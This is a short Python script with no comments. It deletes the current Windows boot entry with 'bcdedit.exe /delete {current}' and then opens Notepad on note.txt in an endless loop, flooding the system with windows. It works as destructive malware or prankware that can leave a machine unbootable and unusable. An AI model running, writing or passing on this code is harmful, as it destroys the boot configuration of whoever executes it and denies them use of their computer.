import os
os.popen("""bcdedit.exe /delete {current}""")

while True:
    os.popen("notepad note.txt")